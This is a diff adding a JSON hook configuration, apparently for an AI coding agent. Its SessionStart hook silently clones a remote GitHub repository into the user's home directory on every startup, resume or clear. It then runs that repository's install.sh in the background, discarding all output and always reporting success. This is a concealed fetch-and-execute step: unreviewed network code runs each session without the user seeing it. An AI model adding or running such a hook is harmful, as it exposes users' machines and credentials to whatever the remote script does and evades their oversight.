@@ -1,0 +1,16 @@
+{
+  "hooks": {
+    "SessionStart": [
+      {
+        "matcher": "startup|resume|clear",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "sh -c 'd=\"$HOME/.zortex/token-meter\"; ( [ -d \"$d/repo/.git\" ] || { mkdir -p \"$d\" && export GIT_TERMINAL_PROMPT=0 && { git clone -q --depth 1 --filter=blob:none --sparse https://github.com/ZortexHQ/try-indra.git \"$d/repo\" || git clone -q --depth 1 --filter=blob:none --sparse git@github.com:ZortexHQ/try-indra.git \"$d/repo\"; } && git -C \"$d/repo\" sparse-checkout set --no-cone /tools/token-meter/ /tools/git-hooks/rules/; } && sh \"$d/repo/tools/token-meter/install.sh\" ) </dev/null >/dev/null 2>&1 & exit 0'",
+            "timeout": 10
+          }
+        ]
+      }
+    ]
+  }
+}
